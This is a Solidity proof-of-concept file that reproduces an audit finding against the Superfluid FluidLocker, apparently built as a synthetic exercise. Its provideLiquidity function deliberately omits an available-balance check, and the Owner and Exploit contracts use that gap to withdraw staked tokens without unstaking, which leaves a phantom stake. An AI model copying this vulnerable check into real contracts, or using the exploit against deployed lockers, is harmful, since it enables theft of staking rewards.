// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Superfluid Locker System — [H-1] Staked tokens inside FluidLocker can be
    withdrawn without calling Unstake
    (Sherlock 2025-06-superfluid-locker-system; #58281)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: FluidLocker.provideLiquidity does NOT validate
    `supAmount <= getAvailableBalance()`, so staked FLUID can be used to open a
    Uniswap V3 position. After tax-free withdrawLiquidity the tokens sit at the
    locker owner, but `_stakedBalance` is unchanged — phantom stake accrues
    staking-reward units forever.

    Vulnerable provideLiquidity entry (missing available-balance check) preserved
    @>. Uniswap V3 / Superfluid pool wiring reduced to a mock NPM that just
    custody-and-returns FLUID. TAX_FREE_WITHDRAW_DELAY set to 0 so the tax-free
    exit path is immediately available without time warps (the delay is not the
    bug). Provenance: sherlock-audit/2025-06-superfluid-locker-system@d8beaeed. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal WETH: deposit wraps ETH; withdraw unwraps.
contract MockWETH {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "eth");
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    receive() external payable {}
}

/// @dev Mock NonfungiblePositionManager: custody FLUID+WETH as a "position",
///      return them on decrease. Enough to show tokens leaving the locker.
contract MockNPM {
    MockWETH public immutable WETH9;
    MockERC20 public immutable FLUID;
    uint256 public nextId = 1;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public fluidOf;
    mapping(uint256 => uint256) public wethOf;
    mapping(uint256 => uint128) public liqOf;

    constructor(MockWETH w, MockERC20 f) {
        WETH9 = w;
        FLUID = f;
    }

    function mint(address to, uint256 fluidAmt, uint256 wethAmt) external returns (uint256 tokenId, uint128 liq) {
        FLUID.transferFrom(msg.sender, address(this), fluidAmt);
        WETH9.transferFrom(msg.sender, address(this), wethAmt);
        tokenId = nextId++;
        ownerOf[tokenId] = to;
        fluidOf[tokenId] = fluidAmt;
        wethOf[tokenId] = wethAmt;
        liq = uint128(fluidAmt); // 1:1 for simplicity
        liqOf[tokenId] = liq;
    }

    function liquidityOf(uint256 tokenId) external view returns (uint128) {
        return liqOf[tokenId];
    }

    function decreaseLiquidity(uint256 tokenId, uint128 /*liq*/)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        amount0 = fluidOf[tokenId];
        amount1 = wethOf[tokenId];
        fluidOf[tokenId] = 0;
        wethOf[tokenId] = 0;
        liqOf[tokenId] = 0;
        FLUID.transfer(msg.sender, amount0);
        WETH9.transfer(msg.sender, amount1);
    }

    function burn(uint256 tokenId) external {
        delete ownerOf[tokenId];
    }

    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256) {
        // linear scan — only one position in the PoC
        for (uint256 id = 1; id < nextId; id++) {
            if (ownerOf[id] == owner) {
                if (index == 0) return id;
            }
        }
        revert("none");
    }
}

/// @dev Reduced FluidLocker focusing on stake / provideLiquidity / withdrawLiquidity /
///      getAvailableBalance / getStakedBalance.
contract FluidLocker {
    MockERC20 public immutable FLUID;
    MockNPM public immutable NONFUNGIBLE_POSITION_MANAGER;
    address public immutable lockerOwner;

    /// @dev Real constant is 180 days; 0 here so tax-free exit is immediate (not the bug).
    uint256 public constant TAX_FREE_WITHDRAW_DELAY = 0;

    uint256 private _stakedBalance;
    uint256 public activePositionCount;
    mapping(uint256 => uint256) public taxFreeExitTimestamps;
    mapping(uint256 => bool) internal _hasPosition;

    error INSUFFICIENT_AVAILABLE_BALANCE();
    error LOCKER_HAS_NO_POSITION();
    error NOT_OWNER();

    event FluidStaked(uint256 totalStakedBalance, uint256 amountAdded);
    event FluidUnstaked();

    constructor(MockERC20 fluid, MockNPM npm, address owner_) {
        FLUID = fluid;
        NONFUNGIBLE_POSITION_MANAGER = npm;
        lockerOwner = owner_;
    }

    modifier onlyLockerOwner() {
        if (msg.sender != lockerOwner) revert NOT_OWNER();
        _;
    }

    function stake(uint256 amountToStake) external onlyLockerOwner {
        if (amountToStake > getAvailableBalance()) revert INSUFFICIENT_AVAILABLE_BALANCE();
        _stakedBalance += amountToStake;
        emit FluidStaked(_stakedBalance, amountToStake);
    }

    function unstake(uint256 amountToUnstake) external onlyLockerOwner {
        require(amountToUnstake <= _stakedBalance, "staked");
        _stakedBalance -= amountToUnstake;
        emit FluidUnstaked();
    }

    /// @dev VERBATIM shape of the audited provideLiquidity (pump/NPM reduced).
    ///      Critical: no `getAvailableBalance()` check on supAmount.
    function provideLiquidity(uint256 supAmount) external payable onlyLockerOwner {
        address weth = address(NONFUNGIBLE_POSITION_MANAGER.WETH9());

        uint256 ethAmount = msg.value;

        // Wrap ETH into WETH
        MockWETH(payable(weth)).deposit{value: ethAmount}();

        // Pumponomics omitted in this finding's reduction (see #58282).

        // Get the amount of paired asset tokens in the locker
        uint256 ethLPAmount = MockWETH(payable(weth)).balanceOf(address(this));

        // FIX: require(supAmount <= getAvailableBalance(), "insufficient available");
        // Missing check above lets staked FLUID leave via the mint below.

        // Approve + create position (mock NPM pulls both tokens)
        MockWETH(payable(weth)).approve(address(NONFUNGIBLE_POSITION_MANAGER), ethLPAmount);
        FLUID.approve(address(NONFUNGIBLE_POSITION_MANAGER), supAmount);

        (uint256 tokenId,) = NONFUNGIBLE_POSITION_MANAGER.mint(address(this), supAmount, ethLPAmount); // @> VULN: no getAvailableBalance() check — staked FLUID can leave
        _hasPosition[tokenId] = true;
        taxFreeExitTimestamps[tokenId] = block.timestamp + TAX_FREE_WITHDRAW_DELAY;
        activePositionCount++;
    }

    function withdrawLiquidity(uint256 tokenId, uint128 liquidityToRemove, uint256, uint256)
        external
        onlyLockerOwner
    {
        if (!_hasPosition[tokenId]) revert LOCKER_HAS_NO_POSITION();

        address weth = address(NONFUNGIBLE_POSITION_MANAGER.WETH9());
        uint128 positionLiquidity = NONFUNGIBLE_POSITION_MANAGER.liquidityOf(tokenId);

        (uint256 withdrawnSup, /*wethAmt*/) = NONFUNGIBLE_POSITION_MANAGER.decreaseLiquidity(tokenId, liquidityToRemove);

        // Unwrap WETH → ETH → owner
        uint256 wBal = MockWETH(payable(weth)).balanceOf(address(this));
        if (wBal > 0) MockWETH(payable(weth)).withdraw(wBal);
        if (address(this).balance > 0) {
            (bool ok,) = lockerOwner.call{value: address(this).balance}("");
            require(ok, "eth send");
        }

        // Tax-free path (delay = 0 → always true at/after mint)
        if (block.timestamp >= taxFreeExitTimestamps[tokenId]) {
            FLUID.transfer(lockerOwner, withdrawnSup);
        }

        if (liquidityToRemove == positionLiquidity) {
            delete taxFreeExitTimestamps[tokenId];
            activePositionCount--;
            _hasPosition[tokenId] = false;
            NONFUNGIBLE_POSITION_MANAGER.burn(tokenId);
        }
    }

    function getStakedBalance() external view returns (uint256) {
        return _stakedBalance;
    }

    function getAvailableBalance() public view returns (uint256 aBalance) {
        // Underflows (reverts) when FLUID balance < _stakedBalance — the post-exploit state.
        aBalance = FLUID.balanceOf(address(this)) - _stakedBalance;
    }

    receive() external payable {}
}

/// @dev Locker owner actor that funds, stakes, provides, withdraws.
contract Owner {
    FluidLocker public locker;
    MockERC20 public fluid;
    MockNPM public npm;

    constructor() {}

    function configure(FluidLocker l, MockERC20 f, MockNPM n) external {
        locker = l;
        fluid = f;
        npm = n;
    }

    function attack(uint256 fundingAmount) external payable {
        // 1. Stake ALL available tokens.
        locker.stake(fundingAmount);
        // 2. provideLiquidity with the STAKED tokens (bug: no available-balance check).
        locker.provideLiquidity{value: msg.value}(fundingAmount);
        // 3. Withdraw liquidity tax-free → tokens to owner. Never called unstake().
        uint256 tokenId = npm.tokenOfOwnerByIndex(address(locker), 0);
        uint128 liq = npm.liquidityOf(tokenId);
        locker.withdrawLiquidity(tokenId, liq, 0, 0);
    }

    receive() external payable {}
}

contract Exploit {
    MockERC20 public fluid; // CREATE nonce 1
    MockWETH public weth; // CREATE nonce 2
    MockNPM public npm; // CREATE nonce 3
    Owner public ownerActor; // CREATE nonce 4
    FluidLocker public locker; // CREATE nonce 5 — vulnerable

    uint256 public constant FUNDING = 100 ether;
    uint256 public phantomStake;

    constructor() {
        fluid = new MockERC20("Fluid", "FLUID");
        weth = new MockWETH();
        npm = new MockNPM(weth, fluid);
        ownerActor = new Owner();
        locker = new FluidLocker(fluid, npm, address(ownerActor));
        ownerActor.configure(locker, fluid, npm);
    }

    function run() external payable {
        // Fund the locker with 100 FLUID (as if distributed/unlocked into it).
        fluid.mint(address(locker), FUNDING);
        require(locker.getAvailableBalance() == FUNDING, "pre: available");
        require(locker.getStakedBalance() == 0, "pre: not staked");

        // Owner stakes all, provides LP with staked tokens, withdraws tax-free.
        // Needs a dust of ETH for the paired asset; msg.value is forwarded.
        uint256 ethAmt = 1 ether;
        ownerActor.attack{value: ethAmt}(FUNDING);

        // HARM: tokens are at the owner, locker is empty, but stakedBalance is still 100e18.
        require(fluid.balanceOf(address(ownerActor)) >= FUNDING * 95 / 100, "owner got fluid");
        require(fluid.balanceOf(address(locker)) == 0, "locker empty");
        require(locker.getStakedBalance() == FUNDING, "phantom stake remains");

        // getAvailableBalance reverts (underflow) because balance < staked.
        (bool ok,) = address(locker).staticcall(abi.encodeWithSelector(FluidLocker.getAvailableBalance.selector));
        require(!ok, "available should revert");

        phantomStake = locker.getStakedBalance();
    }

    receive() external payable {}
}
